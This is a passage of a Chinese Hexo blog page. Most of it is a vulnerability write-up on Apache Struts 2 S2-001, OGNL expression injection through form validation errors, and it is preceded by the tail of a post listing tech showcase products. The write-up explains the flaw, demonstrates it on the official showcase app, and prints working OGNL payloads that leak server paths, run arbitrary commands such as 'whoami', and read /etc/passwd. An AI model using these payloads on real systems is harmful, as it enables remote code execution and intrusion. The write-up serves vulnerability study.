+<h3 id="2-10-摩拜单车"><a href="#2-10-摩拜单车" class="headerlink" title="2.10 摩拜单车"></a>2.10 摩拜单车</h3><ul>
+<li>全世界第一个基于物联网、移动互的自行车。</li>
+<li>800 万辆摩拜单车。</li>
+<li>管理平台：魔方，智能化调动。</li>
+<li>与中国移动联合开发 sim 卡，和高通、华为合作提效率服务。</li>
+<li>和陶氏化学合作，研发新材料。</li>
+<li>9 月份，与联合国发起骑行日活动。</li>
+</ul>
+<h3 id="2-11-阿里巴——-ET-大脑"><a href="#2-11-阿里巴——-ET-大脑" class="headerlink" title="2.11 阿里巴—— ET 大脑"></a>2.11 阿里巴—— ET 大脑</h3><ul>
+<li>超级 人工智能，多维感知、时洞察逐步提升。</li>
+<li>从单点智能到全局。</li>
+<li>技术整合：语音识别、图像数据处理。</li>
+<li>多元数据规模化处理与实时分析。</li>
+<li>治理模式突破、服务产业发展。</li>
+<li>应用：自动调配红绿灯，用于急救车辆通行。</li>
+</ul>
+<h3 id="2-12-百度-——-DUEROS"><a href="#2-12-百度-——-DUEROS" class="headerlink" title="2.12 百度 —— DUEROS"></a>2.12 百度 —— DUEROS</h3><ul>
+<li>听唤醒万物的核心要素：清、懂满足。</li>
+<li>自然语言处理、多轮对话技术。</li>
+<li>应用：智能家居、交通出行手机个人服务知识教育。</li>
+<li>产业链：百度 DuerOS 、芯片商方案硬件。</li>
+</ul>
+<h3 id="2-13-亚马逊-——-AWS-IOT"><a href="#2-13-亚马逊-——-AWS-IOT" class="headerlink" title="2.13 亚马逊 —— AWS IOT"></a>2.13 亚马逊 —— AWS IOT</h3><ul>
+<li>Things—— Cloud —— Intelligence。</li>
+<li>两个问题：法规角度不允许 +XXX。</li>
+<li>IOT 优势：快速响应、离线操作简化设备编程降低物联网用成本。</li>
+</ul>
+<h3 id="2-14-苹果-——-ARKit"><a href="#2-14-苹果-——-ARKit" class="headerlink" title="2.14 苹果 —— ARKit"></a>2.14 苹果 —— ARKit</h3><ul>
+<li>AppStore 生态，创造 180 万个就业机会。</li>
+<li>苹果 ARKit 硬件：摄像头、中央处理器和图形运动传感。</li>
+<li>优势：快速、稳定的运动跟踪边界和平面预测环境光线多模板支持。</li>
+<li>体验川剧变脸。</li>
+</ul>
+<h3 id="2-15-除了以上多独立成果由嘉宾现场讲解外，组委会还联合发布了入围的-4-项先进技术，分别是："><a href="#2-15-除了以上多独立成果由嘉宾现场讲解外，组委会还联合发布了入围的-4-项先进技术，分别是：" class="headerlink" title="2.15 除了以上多独立成果由嘉宾现场讲解外，组委会还联合发布了入围的 4 项先进技术，分别是："></a>2.15 除了以上多独立成果由嘉宾现场讲解外，组委会还联合发布了入围的 4 项先进技术，分别是：</h3><ul>
+<li>腾讯人工智能开放平台</li>
+<li>Watson 健康助力“健康中国”</li>
+<li>下一代互联网关键技术 IPV6</li>
+<li>机器触觉（Syn Touchinc）</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.bruce.wang/2017/12/01/Struts 2 漏洞系列之 S2-001/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BruceWang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceWang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/01/Struts 2 漏洞系列之 S2-001/" itemprop="url">Struts 2 漏洞系列之 S2-001</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T11:11:11+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞研究/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>转自&nbsp;<a href="http://bruce.wang" target="_blank" rel="noopener">王小龍的博客</a></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;Struts&nbsp;2&nbsp;框架的表单验证机制（&nbsp;Validation&nbsp;）主要依赖于两个拦截器：<code>validation</code>&nbsp;和&nbsp;<code>workflow</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>validation</code>&nbsp;拦截器工作时，会根据&nbsp;XML&nbsp;配置文件来创建一个验证错误列表；<code>workflow</code>&nbsp;拦截器工作时，会根据&nbsp;<code>validation</code>&nbsp;拦截器所提供的验证错误列表，来检查当前所提交的表单是否存在验证错误。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;在默认配置下，如果&nbsp;<code>workflow</code>&nbsp;拦截器检测到用户所提交的表单存在任何一个验证错误，<code>workflow</code>&nbsp;拦截器都会将用户的输入进行解析处理，随即返回并显示处理结果。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;那么问题出在哪里呢？我们再来了解&nbsp;Struts&nbsp;2&nbsp;框架中的一个标签处理功能：&nbsp;<code>altSyntax</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>altSyntax</code>&nbsp;功能是&nbsp;Struts&nbsp;2&nbsp;框架用于处理标签内容的一种新语法（不同于普通的&nbsp;HTML&nbsp;），该功能主要作用在于支持对标签中的&nbsp;OGNL&nbsp;表达式进行解析并执行。比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:iterator</span> <span class="attr">value</span>=<span class="string">"cart.items"</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">   <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"'Cart item No.' + #rowstatus.index + ' note'"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">name</span>=<span class="string">"'cart.items[' + #rowstatus.index + '].note'"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">value</span>=<span class="string">"note"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:iterator</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;上述代码在开启&nbsp;<code>altSyntax</code>&nbsp;功能后，可以这么写（引入&nbsp;OGNL&nbsp;表达式）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:iterator</span> <span class="attr">value</span>=<span class="string">"cart.items"</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">   <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Cart item No. %&#123;#rowstatus.index&#125; note"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">name</span>=<span class="string">"cart.items[%&#123;#rowstatus.index&#125;].note"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">value</span>=<span class="string">"%&#123;note&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:iterator</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>altSyntax</code>&nbsp;功能在处理标签时，对&nbsp;OGNL&nbsp;表达式的解析能力实际上是依赖于开源组件&nbsp;XWork。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;于是，在&nbsp;XWork&nbsp;组件版本小于&nbsp;2.0.4&nbsp;以及&nbsp;<code>altSyntax</code>&nbsp;功能开启的情况下，恶意攻击者可以通过提交一个带有&nbsp;OGNL&nbsp;表达式的表单请求，故意触发表单验证错误——最终该表单请求中恶意的&nbsp;OGNL&nbsp;表达式会被&nbsp;XWork&nbsp;组件解析并执行，随即由&nbsp;<code>workflow</code>&nbsp;拦截器返回执行结果。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本次测试我们使用的代码是官方提供的&nbsp;<code>struts2-showcase-2.0.1</code>，&nbsp;XWork&nbsp;版本小于&nbsp;<code>2.0.4</code>，且&nbsp;<code>altSyntax</code>&nbsp;功能默认是开启的，无需再手动配置。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;测试&nbsp;Demo&nbsp;表单中一共有三个值：<code>name</code>、<code>age</code>&nbsp;和&nbsp;<code>answer</code>。表单代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Name"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Age"</span> <span class="attr">name</span>=<span class="string">"age"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Favorite color"</span> <span class="attr">name</span>=<span class="string">"answer"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>validation</code>&nbsp;拦截器设置的条件是&nbsp;<code>age</code>&nbsp;的值必须在13和19之间，配置信息如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"requiredstring"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>You must enter a name<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>19<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>Only people ages 13 to 19 may take this quiz<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;测试&nbsp;Demo&nbsp;界面效果图如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-5ff9bd5a4dca0cd5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="S2-001 DEMO"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;现在我们来模拟恶意用户：</p>
+<ul>
+<li>1.&nbsp;POST&nbsp;提交正常数据：<code>name=test&amp;age=14&amp;answer=black</code>，回显正常。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-040a84c2725c327b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>2.&nbsp;POST&nbsp;提交触发验证错误的正常数据：<code>name=test&amp;age=10&amp;answer=black</code>，回显输入内容并提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-a0e6f8d3f63a314b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>3.&nbsp;POST&nbsp;提交特殊构造的恶意数据：<code>name=%{11+12}&amp;age=10&amp;answer=%{2017+2018}</code>，回显恶意&nbsp;OGNL&nbsp;表达式的执行结果，并提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-e145aa599a14ace0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>4.&nbsp;POST&nbsp;提交攻击代码：<code>name=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}&amp;age=10&amp;answer=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code>，回显攻击代码的执行结果，镔铁提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-e5d8cf4514e8410d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本文所提供的&nbsp;POC&nbsp;仅供研究学习，请勿用于非法用途！</p>
+<ul>
+<li>获取tomcat执行路径：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取Web路径：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  #req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">  #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),</span><br><span class="line">  #response.println(#req.getRealPath('/')),</span><br><span class="line">  #response.flush(),</span><br><span class="line">  #response.close()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行任意命令:</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"whoami"&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行任意命令时，如果所执行的命令需要组合，则将上述&nbsp;payload&nbsp;改为：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"cat","/etc/passwd"&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><ul>
+<li>需要了解&nbsp;Struts&nbsp;2&nbsp;框架的表单验证机制。</li>
+<li>需要了解&nbsp;OGNL&nbsp;表达式。</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>官方的&nbsp;<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">漏洞链接</a>。</li>
+<li>开源&nbsp;<a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">payload</a>&nbsp;提供者。</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">BruceWang</p>
+              <p class="site-description motion-element" itemprop="description">filtering noise and focusing on threats</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BruceWang</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
